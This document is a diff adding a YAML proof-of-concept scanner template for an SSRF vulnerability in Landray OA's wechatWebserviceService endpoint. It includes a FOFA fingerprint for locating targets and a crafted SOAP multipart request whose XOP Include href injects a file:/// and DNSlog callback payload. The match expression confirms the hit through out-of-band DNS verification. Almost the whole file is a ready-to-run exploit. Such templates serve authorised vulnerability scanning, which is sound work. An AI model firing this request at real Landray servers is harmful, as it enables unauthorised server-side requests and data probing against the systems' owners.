@@ -1,0 +1,32 @@
+id: poc-yaml-landray-wechatwebserviceservice-ssrf
+info:
+  name: 蓝凌OA wechatWebserviceService SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: landray
+  fofa: app="Landray-OA系统"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  payload: 'file:///
+
+    "http://" + str(domain)
+
+    '
+requests:
+- method: POST
+  path: /sys/webservice/wechatWebserviceService
+  headers:
+    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+  data: "------4upt9dwdca8rtwq9osuz\nContent-Disposition: form-data; name=\"a\"\n\n\
+    <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:web=\"http://service.wechat.third.kmss.landray.com/\">\n<soapenv:Header/>\n\
+    <soapenv:Body>\n    <web:getAttachement>\n        <arg0>\n            <beginTimeStamp>a</beginTimeStamp>\n\
+    \            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\"\
+    \ href=\"{{.payload}}\"/></count>\n        </arg0>\n    </web:getAttachement>\n\
+    </soapenv:Body>\n</soapenv:Envelope>\n------4upt9dwdca8rtwq9osuz--"
+  expression: (contains(body,"意外的文本") && reverse.Verify()) || (contains(body,"意外的文本")
+    && contains(content_type,"text/xml"))
+transport: http
